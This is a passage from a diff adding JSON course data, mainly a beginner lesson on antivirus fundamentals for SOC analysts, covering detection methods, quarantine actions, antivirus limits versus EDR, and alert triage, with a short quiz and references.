+    "https://csrc.nist.gov/pubs/sp/800/41/r1/final",
+    "https://attack.mitre.org/techniques/T1071/"
+  ],
+  "xp": 200,
+  "estimatedMinutes": 40,
+  "researchUsed": false,
+  "createdAt": "2026-08-15T00:00:00.000Z"
+},
+{
+  "id": "topic-lesson-antivirus-fundamentals",
+  "slug": "antivirus-fundamentals",
+  "title": "Antivirus Fundamentals",
+  "topic": "Endpoint Security",
+  "difficulty": "beginner",
+  "kind": "lesson",
+  "intro": "Antivirus is the security control almost everyone has heard of — the software that scans for and removes malware. But for a SOC analyst, 'antivirus caught something' is the beginning of an investigation, not the end, and understanding how antivirus actually decides what is malicious (and what it inevitably misses) is essential to triaging its alerts correctly. This lesson explains what antivirus is, the detection methods it uses, what it does when it finds something, its real limitations, and how an analyst reads an antivirus alert — including the critical difference between a threat that was blocked and one that was merely detected.",
+  "sections": [
+    {
+      "heading": "What Antivirus Is and How It Detects",
+      "content": "**Antivirus (AV)** is software that detects, blocks, and removes malicious programs — malware — from a computer. It runs on endpoints (laptops, servers) and continuously watches for files and behaviours it recognises as harmful. It is the most established layer of endpoint defence, and for most machines it is the first automated line stopping known threats.\n\nThe core of antivirus is **how it decides something is malicious**, and there are several detection methods, each with different strengths. Knowing them explains both what AV catches and what it misses.\n\n- **Signature-based detection.** The classic method: the AV maintains a huge database of **signatures** — fingerprints of known malware, such as a file's hash or a distinctive byte pattern. When it scans a file, it checks whether the file matches a known signature. This is fast and accurate for *known* malware, but it is blind to anything new — a threat with no signature yet slips through. The analogy is recognising a known criminal from a wanted-poster photo: excellent if you have the photo, useless for someone new.\n- **Heuristic detection.** To catch variants and unknown files, AV uses **heuristics** — rules and static analysis that look for *suspicious characteristics* rather than an exact match: code that resembles known malware families, suspicious structure, or known-bad techniques. Heuristics catch more, but at the cost of occasional **false positives** (flagging benign files).\n- **Behaviour-based detection.** Rather than judging a file at rest, this watches what a program *does when it runs* — if it starts encrypting many files, injecting into other processes, or modifying system settings, it is flagged by behaviour even if its file was unknown. This catches novel and fileless threats that static methods miss.\n- **Machine learning and cloud reputation.** Modern AV adds ML models trained to distinguish malicious from benign files, and **cloud reputation** lookups that check a file's prevalence and history across millions of machines — a brand-new, rare, unsigned file is inherently more suspicious.\n\nMost real antivirus blends all of these. The key insight for an analyst is that **each method has a blind spot**: signatures miss the new, heuristics can false-positive, behaviour needs the threat to run first. That layered-but-imperfect nature is exactly why AV alerts require human judgement, and why AV is one layer rather than the whole defence."
+    },
+    {
+      "heading": "Scanning Modes and What AV Does on a Detection",
+      "content": "Antivirus applies its detection methods in two timing modes, and takes specific actions when it finds something — both of which shape the alerts an analyst sees.\n\n**Real-time (on-access) scanning.** The AV inspects files *as they are accessed* — created, opened, downloaded, or executed — and can block a threat before it runs. This is the always-on protection that stops a malicious download the moment it lands. It is the most important mode for prevention, because it acts at the instant of danger.\n\n**On-demand scanning.** A scan the user or admin runs deliberately — a full or targeted sweep of the disk — to find dormant threats that may have been missed or that arrived before protection was in place. Scheduled scans are a form of this.\n\n**What AV does when it detects a threat.** The action taken is crucial for an analyst to understand, because it determines whether the threat was neutralised:\n\n- **Quarantine** — the most common action: the AV isolates the file, moving it to a secure, locked location where it cannot execute, while preserving it (so it can be restored if it was a false positive, or analysed). A quarantined threat is contained.\n- **Block / prevent** — the AV stops the malicious action from happening at all (for example, preventing execution).\n- **Remove / delete / clean** — the AV deletes the malicious file or attempts to remove malicious parts from an infected file.\n- **Allow / detect only** — in some configurations, or when it lacks permission, the AV *reports* the detection but does **not** stop it. This is the dangerous case, covered in the final section.\n\nAlongside the action, the AV records a **detection name** — a label like `Trojan:Win32/...` — that identifies what it thinks it found. These names are vendor-specific and sometimes generic, so they are a starting hint, not a definitive verdict.\n\nThe practical point is that **a detection and a successful response are two different things**. The most important question when an AV alert arrives is not just \"what did it find?\" but \"**what did it actually do about it — and did that succeed?**\" A quarantined or blocked threat is contained; a merely-detected one may still be active. Reading that action correctly is the heart of AV alert triage."
+    },
+    {
+      "heading": "The Limits of Antivirus — and AV vs EDR",
+      "content": "Antivirus is essential, but understanding its **limits** is what separates a novice who trusts every green checkmark from an analyst who knows when to keep digging.\n\n**What antivirus struggles with:**\n\n- **Zero-day and novel malware.** Signature-based detection is blind to threats it has never seen, and even heuristics and ML miss genuinely new techniques. Fresh malware routinely evades AV for a window of time.\n- **Fileless and living-off-the-land attacks.** Much modern intrusion uses no malicious *file* at all — abusing legitimate tools like PowerShell, WMI, and built-in binaries (LOLBins). Traditional file-scanning AV has little to grab onto when there is no file to scan.\n- **Evasion techniques.** Attackers deliberately defeat AV by **packing** and **obfuscating** their code (changing its appearance to break signatures), encrypting payloads, and testing their malware against AV engines before deploying it. Some malware also tries to disable the AV outright.\n- **In-memory and injected code.** Code running only in memory, or injected into a trusted process, may never touch disk where file scanning looks.\n\nThese gaps are exactly why the industry moved beyond classic AV, and it is worth being clear on the vocabulary:\n\n- **Traditional AV** focuses on detecting and blocking known-bad *files*, mostly at the moment of access. It answers \"is this file malicious?\"\n- **NGAV (Next-Generation Antivirus)** strengthens this with heavier behaviour analysis, ML, and cloud reputation to catch more of the unknown and fileless threats.\n- **EDR (Endpoint Detection and Response)** goes further still: rather than only blocking, it **records** endpoint activity continuously (processes, connections, file and registry changes) so analysts can *hunt, investigate, and respond* to threats that got past prevention — including the fileless and in-memory attacks AV misses. (EDR has its own lesson.)\n\nThe relationship is layered, not either/or: AV/NGAV is the **prevention** layer that stops the majority of known and obvious threats automatically, and EDR is the **detection and response** layer that gives analysts visibility into what prevention missed. A mature endpoint strategy runs both. For an analyst, the mental model is that **antivirus is a strong filter, not a guarantee** — a clean AV result narrows the odds but never proves a machine is safe, which is why AV alerts feed into a broader investigation rather than closing it."
+    },
+    {
+      "heading": "Reading Antivirus Alerts as an Analyst",
+      "content": "When an antivirus alert reaches the SOC, the analyst's job is to interpret it correctly and decide what to do next. A few fields and one critical distinction drive that triage.\n\n**What an AV alert contains:**\n\n- The **detection name** — what the AV thinks it found (e.g. a trojan, a specific family, or a generic label). Treat this as a lead, not a final verdict.\n- The **file path and hash** — *what* was detected and *where* it sat. The path is telling: malware in a user's Temp or Downloads folder, or masquerading in a system directory, is more suspicious than a flagged file in an expected location.\n- The **action taken** — quarantined, blocked, removed, or only detected/allowed.\n- The **host and user**, and the **timestamp**.\n\n**The single most important question: was it actually stopped?** The difference between \"**quarantined/blocked**\" and \"**detected but not remediated**\" changes everything:\n\n- A threat that was **quarantined or blocked** is contained. You still investigate how it arrived and whether it acted first, but the immediate danger is handled.\n- A threat that was **detected but not quarantined or blocked** — because of a permission issue, an error, or the AV being configured to detect-only — means **the malicious file may still be present and active.** This is a high-priority situation: the AV saw the threat and did *not* stop it, so containment now falls to you.\n\nThis is why an analyst never reads an AV alert as simply \"AV handled it.\" You read the *action*, and if it is anything other than a clean quarantine/block, you treat the host as potentially compromised.\n\n**How AV alerts fit the bigger picture.** A single AV detection is a thread to pull, not a closed case, because AV catches the *symptom* it recognised while the rest of an intrusion may be invisible to it. Sound triage pivots outward:\n\n- **To the endpoint / EDR** — what process dropped or launched the file? What is its process tree (recall that lesson)? Did anything else run around the same time?\n- **To repetition and spread** — is the same detection firing on other machines (a campaign or worm)?\n- **To what preceded it** — a phishing email, a suspicious download, a new scheduled task or service.\n\nThe overarching mindset: **antivirus tells you what it managed to recognise, which is a lower bound on what happened, not the whole story.** A blocked detection is reassuring but still worth understanding; an unblocked detection is an active incident. Reading the action correctly, and pivoting from the AV alert into the endpoint's fuller telemetry, is how a routine antivirus notification becomes a properly scoped investigation."
+    }
+  ],
+  "keyTakeaways": [
+    "Antivirus detects malware using layered methods — signature (fingerprints of known-bad, fast but blind to the new), heuristics (suspicious characteristics, can false-positive), behaviour (what a program does at runtime), and ML/cloud reputation — each with a blind spot, which is why AV needs human judgement.",
+    "AV scans in real-time (on-access, blocking threats as files are used) and on-demand (deliberate sweeps), and on a detection it quarantines (isolates), blocks, removes, or in some cases only detects/allows — recording a vendor-specific detection name that is a lead, not a verdict.",
+    "AV struggles with zero-day/novel malware, fileless/living-off-the-land attacks, evasion (packing/obfuscation), and in-memory/injected code; NGAV adds behaviour/ML and EDR adds continuous recording for hunt and response — AV is the prevention layer, EDR the detection/response layer, and both run together.",
+    "When triaging an AV alert, the critical question is the action taken: quarantined/blocked means contained, but detected-but-not-remediated means the threat may still be active (high priority) — then pivot to endpoint/EDR (what process dropped it, its process tree), check for spread, and look at what preceded it, because AV shows only what it recognised."
+  ],
+  "quiz": [
+    {
+      "question": "An antivirus alert shows a trojan was 'detected' on a workstation, but the action field reads 'not remediated' rather than 'quarantined'. Why should this raise your priority, and what should you assume?",
+      "options": [
+        {
+          "label": "It is lower priority, because 'detected' always means the antivirus fully removed the threat and 'not remediated' simply confirms cleanup finished successfully.",
+          "value": "a"
+        },
+        {
+          "label": "The AV saw the threat but did not stop it, so the malicious file may still be present and active, making containment your responsibility now.",
+          "value": "b"
+        },
+        {
+          "label": "It means the file was a guaranteed false positive, because antivirus only ever leaves genuinely harmless files unremediated and blocks all real malware.",
+          "value": "c"
+        },
+        {
+          "label": "It proves the workstation has no antivirus installed, since a real antivirus product is technically incapable of detecting without also removing.",
+          "value": "d"
+        }
+      ],
+      "answer": "b",
+      "explanation": "A detection with no successful remediation means the AV recognised the threat but did not quarantine or block it, so the malicious file may still be present and active — a high-priority situation where containment now falls to the analyst. Option a wrongly equates 'detected' with removed. Option c falsely assumes unremediated means false positive. Option d is wrong because AV can detect without remediating (due to permissions, errors, or detect-only configuration) while still being installed."
+    },
+    {
+      "question": "Why is a modern intrusion that abuses PowerShell and other built-in tools (a fileless / living-off-the-land attack) often able to evade traditional signature-based antivirus?",
+      "options": [
+        {
+          "label": "Because traditional AV focuses on scanning malicious files, and a fileless attack uses legitimate built-in tools with no malicious file to match a signature against.",
+          "value": "a"
+        },
+        {
+          "label": "Because PowerShell automatically disables all antivirus products the moment it launches, leaving the endpoint completely without any protection at all.",
+          "value": "b"
+        },
+        {
+          "label": "Because signature-based antivirus only scans network traffic and never inspects any programs or scripts running locally on the endpoint itself.",
+          "value": "c"
+        },
+        {
+          "label": "Because living-off-the-land attacks are encrypted end to end, so antivirus is contractually forbidden by the vendor from inspecting them.",
+          "value": "d"
+        }
+      ],
+      "answer": "a",
+      "explanation": "Traditional signature-based AV is built to recognise malicious files, but a fileless/living-off-the-land attack abuses legitimate built-in tools like PowerShell and leaves little or no malicious file to match a signature against, so it slips past file-scanning. Option b is false because PowerShell does not automatically disable AV. Option c is wrong because AV does scan local files and programs, not only network traffic. Option d invents a contractual restriction that does not exist."
+    }
+  ],
+  "references": [
+    "https://learn.microsoft.com/en-us/defender-endpoint/next-generation-protection",
+    "https://attack.mitre.org/techniques/T1562/001/",
+    "https://csrc.nist.gov/glossary/term/antivirus_software"
+  ],
+  "xp": 200,
+  "estimatedMinutes": 40,
+  "researchUsed": false,
+  "createdAt": "2026-08-15T00:00:00.000Z"
 }
 ];
 
